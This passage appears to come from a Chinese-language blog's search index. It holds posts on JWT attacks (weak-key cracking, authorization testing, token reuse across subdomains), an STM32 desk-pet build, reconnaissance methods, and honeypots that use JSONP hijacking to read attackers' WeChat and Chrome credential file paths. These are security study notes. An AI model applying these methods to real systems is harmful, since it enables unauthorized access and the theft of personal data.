<p>​	5&gt;<strong>密钥爆破</strong>：如果服务器使用了弱密钥，可以尝试使用密钥字典进行爆破，获取用于签名的密钥<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	6&gt;<strong>SQL注入绕过key</strong>：在某些情况下，如果JWT令牌中包含SQL注入漏洞，可以通过注入攻击绕过密钥验证<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<h6 id="2、利用jwt"><a href="#2、利用jwt" class="headerlink" title="2、利用jwt"></a>2、利用jwt</h6><h6 id="—-找api看越权"><a href="#—-找api看越权" class="headerlink" title="—&gt;找api看越权"></a>—&gt;找api看越权</h6><p>​	拿小程序来说，一般会直接给你一个jwt，这个jwt在服务器里面没有绑定任何用户，里面一般会有一个类似于openid的存在，当然有些要你注册或者登录才会响应一个jwt或者token</p>
<p>​	1&gt;将小程序反编译出来的代码进行分析整理，可以用我上面给的自动化反编译的那个软件，主要整理出接口和网址</p>
<p>​	2&gt;有接口就直接爆GET、POST、PUT、HEAD、TRACE等（生产环境没事别爆delete，爆成功等死）分析响应包，很明显的，一般就几种响应，要么200，要么权限不足，要么返回数据，要么说你类型错误，当然还有给你拉小黑屋的</p>
<p>​	3&gt;有响应就分析操作；该方法主要是找api，不一定只有反编译的js里有，其本身小程序也是前端，可以尝试更改响应包跑前端的接口</p>
<h6 id="—-同一域名使用"><a href="#—-同一域名使用" class="headerlink" title="—&gt;同一域名使用"></a>—&gt;同一域名使用</h6><p>​	拿网址举例，123.123.com的合法jwt，或许是可以到111.123.com的网址使用的，也就是说，如果你一个网址没有权限，可以先尝试去找一样域名的其他网址去注册一个合法用户，获得jwt后尝试直接使用该网址的功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>js</tag>
        <tag>Cybersecurity</tag>
        <tag>jwt</tag>
        <tag>keys</tag>
      </tags>
  </entry>
  <entry>
    <title>智能桌宠</title>
    <url>/2024/12/18/%E6%99%BA%E8%83%BD%E6%A1%8C%E9%9D%A2%E5%AE%A0%E7%89%A9/</url>
    <content><![CDATA[<p>该文章为尝试进行智能桌宠的搭建前记录的相关流程和笔记，以免自己行动时步骤不对直接爆炸；</p>
<h2 id="教程视频"><a href="#教程视频" class="headerlink" title="教程视频"></a>教程视频</h2><p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc">STM32智能桌面宠物总教程_哔哩哔哩_bilibili</a>	该视频为搭建桌宠的教程</p>
<p>​	总计花费3.6元购买了总材料</p>
<h3 id="视频步骤"><a href="#视频步骤" class="headerlink" title="视频步骤"></a>视频步骤</h3><span id="more"></span>

<h5 id="嘉立创下单PCB和3D打印"><a href="#嘉立创下单PCB和3D打印" class="headerlink" title="嘉立创下单PCB和3D打印"></a>嘉立创下单PCB和3D打印</h5><p>​		—&gt;用他的模板，导出文件后去领卷买东西</p>
<p>​		（1）、<a href="https://pro.lceda.cn/">构建单片机的软件</a>	可有可无</p>
<p>​		（2）、<a href="https://www.jlc.com/portal/appDownloadsWithConfig.html">嘉立创PCB下单</a></p>
<p><img src="/../image/Smart_table_pets/buy_pcb.png"></p>
<p>​			后面下单参数太多懒得截图：</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=390">STM32智能桌面-跳转到第390秒</a></p>
<p>​			哔哩哔哩把跳转参数关了的话就是该教程的6:30分处</p>
<p>​			（3）、嘉立创3D打印下单</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=461">STM32智能桌面-跳转到第7:41</a></p>
<h5 id="焊接"><a href="#焊接" class="headerlink" title="焊接"></a>焊接</h5><h6 id="1-焊接视频"><a href="#1-焊接视频" class="headerlink" title="1&gt;焊接视频"></a>1&gt;焊接视频</h6><p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=481">STM32智能桌面-跳转到第8:01</a></p>
<p>​		（1）、焊接开关</p>
<p>​			—&gt;焊接开关时，一定要先焊接开关左侧的</p>
<p>​			—&gt;先上锡固定开关左侧一角，然后直接焊其他角</p>
<p><img src="/../image/Smart_table_pets/Welding_switches.jpg" alt="焊接开关后成品"></p>
<p>​		（2）、焊接电阻、LED灯</p>
<p>​			—&gt;LED反面有箭头，必须保证箭头朝上</p>
<p>​			然后在电阻的右侧焊接AMS芯片</p>
<p>​					(c1、c2全是电容)</p>
<p>​			可以用锂电池进行测试—确保开关已拨通</p>
<p><img src="/../image/Smart_table_pets/hj_1-2.jpg"></p>
<p>​		（3）、焊接电容</p>
<p>​			—&gt;C1为10UF、C2为100NF</p>
<p>​			<img src="/../image/Smart_table_pets/Soldering_capacitors.jpg"></p>
<p><img src="/../image/Smart_table_pets/Soldering_capacitors2.jpg"></p>
<p>​			—&gt;当然右侧开关那还有一堆电容</p>
<p>​		（4）、焊接电源排针</p>
<p><img src="/../image/Smart_table_pets/hj_1-4.jpg"></p>
<p>​		（5）、焊接1X20P的排母</p>
<p>​			—&gt;只需要焊接两部分，即开头、结尾两行：</p>
<p><img src="/../image/Smart_table_pets/hj_1-5.jpg"></p>
<p>​			<img src="/../image/Smart_table_pets/hj_1-5_2.jpg"></p>
<p>​			—&gt;单片机的两种选择{<a href="%E6%8E%92%E9%92%88%E8%BF%87%E9%95%BF%E4%BC%9A%E5%8E%8B%E5%88%B0%E4%B8%8B%E9%9D%A2%E7%9A%84%E7%94%B5%E6%B1%A0">焊接好排针的</a>、[直接带排针的]、<a href="%E8%80%83%E9%AA%8C%E7%84%8A%E6%8E%A5%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E9%80%890%EF%BC%8C%E7%84%B6%E5%90%8E%E5%89%AA%E6%8E%89%E9%95%BF%E7%9A%84">不焊接排针的</a>}</p>
<p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=815">STM32智能桌面-跳转到第13:35</a>  —不焊接排查麻烦但可以避免压到电池和语音模块不好插上</p>
<p>​		（6）、焊接XH直针</p>
<p>​		—&gt;右上角焊接XH直针     &#x2F;&#x2F;语音模块的咪头和喇叭处也是</p>
<p>​		—&gt;语音模块焊接排针</p>
<h6 id="2-其余相关注意事项"><a href="#2-其余相关注意事项" class="headerlink" title="2&gt;其余相关注意事项"></a>2&gt;其余相关注意事项</h6><p>​		（1）、锂电池的正负极分别充放电模块的B+和B</p>
<p>​		（2）、输出电源线要接好—是焊接到模块中央位置两侧：</p>
<p><img src="/../image/Smart_table_pets/zy_2-2.jpg"></p>
<p>​		（3）、喇叭没有正负，味头上有三条线的是负极</p>
<h6 id="3-程序"><a href="#3-程序" class="headerlink" title="3&gt;程序"></a>3&gt;程序</h6><p>​		（1）、串口下载单片机程序</p>
<p>​			—&gt;使用前需要安装CH340的环境驱动</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=900">STM32智能桌面-跳转到第15:00</a> </p>
<p>​		（2）、接线部分</p>
<p>​			接线—接线烧录 &#x2F; CH340</p>
<p>​			—&gt;使用前拔跳线帽</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=941">STM32智能桌面-跳转到第15:41</a> </p>
<p>​		（3）、烧录语音部分</p>
<p>​			—&gt;点击烧录后，需要拔5V线等两秒再接上去</p>
<p>​			</p>
<h6 id="4-组装"><a href="#4-组装" class="headerlink" title="4&gt;组装"></a>4&gt;组装</h6><p>​		（1）、模型组装</p>
<p>​			—&gt;考验手工了，前面都完成了，这里应该没什么问题了</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1114">STM32智能桌面-跳转到第18:34</a></p>
<p>​			—&gt;用面包板线将OLED的排母与做成的排母相连时，要看好你OLED屏幕左侧是GND还是VCC</p>
<p>​		（2）、排线</p>
<p>​			—&gt;太长了剪掉重新接应该也可以</p>
<h6 id="5-语音网站配置"><a href="#5-语音网站配置" class="headerlink" title="5&gt;语音网站配置"></a>5&gt;语音网站配置</h6><p>​		（1）、智能公元网址</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1640">STM32智能桌面-跳转到第27:20</a></p>
<p>​		（2）、代码逻辑</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1860">STM32智能桌面-跳转到第31:00</a></p>
<p>结束语：此篇文章为制作前的准备，如果爆炸了不想做了与我无关</p>
]]></content>
      <categories>
        <category>microcontroller</category>
      </categories>
      <tags>
        <tag>单片机</tag>
        <tag>狗</tag>
        <tag>三次元</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集思路</title>
    <url>/2024/12/20/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="信息搜集思路扩散"><a href="#信息搜集思路扩散" class="headerlink" title="信息搜集思路扩散"></a>信息搜集思路扩散</h1><p>​	1.ico图标搜集</p>
<p>​	2.icp备案号&#x2F;icp.name备案公司搜集</p>
<p>​	3.域名搜集———简写域名搜集&#x2F;子域名搜集</p>
<span id="more"></span>

<p>​	4.关键字搜寻-title&#x2F;body</p>
<p>​	5.中标公司，名下公司查询—涉及就查</p>
<p>​	6.证书查询</p>
<p>​	7.图片搜索—基本没用</p>
<p>​		1&gt;联合&#x2F;递归查询</p>
<p>​		2&gt;爆破域名查询——-针对空间测绘找不到的影子资产</p>
<p>​		3&gt;域名目录更改—–例如，ab.sb.com——&gt;ab.sb.com&#x2F;ab          目录爆破**</p>
<h1 id="找网址漏洞的信息搜集思路"><a href="#找网址漏洞的信息搜集思路" class="headerlink" title="找网址漏洞的信息搜集思路"></a>找网址漏洞的信息搜集思路</h1><p>​	1.要是信息搜集能力强于web渗透思路如下</p>
<p>​		1&gt;与其在网址上找漏洞不如，根据漏洞找对应网址</p>
<p>​	2.web渗透强于其他</p>
<p>​		2&gt;搜集边缘&#x2F;影子资产，从易到难</p>
<h1 id="根据公众号找web的思路"><a href="#根据公众号找web的思路" class="headerlink" title="根据公众号找web的思路"></a>根据公众号找web的思路</h1><p>​	1.找合作公司的公众号，找相关的功能web</p>
<p>​	2.找到公众号所有的web，根据域名找公司，根据公司找公众号，以此往复***</p>
<p>​	3.根据全称公众号，找下面的无关公众号点点，可能存在你要找的内容功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Information</tag>
        <tag>Official account</tag>
      </tags>
  </entry>
  <entry>
    <title>蜜罐怎么获取个人信息</title>
    <url>/2024/12/20/%E8%9C%9C%E7%BD%90%E8%8E%B7%E5%8F%96%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h3 id="蜜罐防守"><a href="#蜜罐防守" class="headerlink" title="蜜罐防守"></a>蜜罐防守</h3><p>​	蜜罐主要是通过web蜜罐和mysql蜜罐来获取个人信息</p>
<p>​	蜜罐通过模拟各种服务来获取个人信息，但也跟漏洞JSONP有关</p>
<p>​	蜜罐获取个人信息主要是依赖用户所注册的网址存在JSONP、XSS等信息泄露的漏洞</p>
<span id="more"></span>

<p><strong>JSONP漏洞与CSRF非常相似，但JSONP劫持只能获得js返回的敏感数据</strong></p>
<p><strong>JSONP劫持步骤：</strong></p>
<p>​	1.蜜罐被访问url</p>
<p>​	2.蜜罐返回包含回调函数的JS代码</p>
<p>​	3.访问网址B时-将回调函数作为参数请求</p>
<p>​	4.返回包含用户信息的JSON数据</p>
<p>​	5.上传用户信息数据到蜜罐</p>
<p><strong>读取微信号</strong></p>
<p>win系统下，读取手机号和微信ID的方法（默认常见微信文件路径）</p>
<p>我们可以下面的步骤来获取用户的微信号</p>
<p>1）通过C:&#x2F;Windows&#x2F;PFRO.log获取windows用户名</p>
<p>2）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;All Users&#x2F;config&#x2F;config.data获取wxid</p>
<p>3）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;wx_id&#x2F;config&#x2F;AccInfo.dat获取微信号、手机号</p>
<p><strong>读取chrome的登录数据</strong></p>
<p>读取chrome的login data，虽然无法解密出密码，但是还是可以获取到对方的一些账号</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;Login Data</p>
<p><strong>chrome的历史记录</strong></p>
<p>我们还可以读取chrome的历史记录</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;History</p>
<p>开源蜜罐系统hfish中的mysql蜜罐就利用了这种方式来获取攻击者的文件，如下首先在蜜罐中设置要读取的文件。</p>
<p><img src="/../image/Honeypot/%E8%9C%9C%E7%BD%90.png" alt="蜜罐"></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Cybersecurity</tag>
        <tag>Honeypot</tag>
        <tag>Information Gathering</tag>
        <tag>Intrusion Detection</tag>
        <tag>Attack Analysis</tag>
      </tags>
  </entry>
</search>
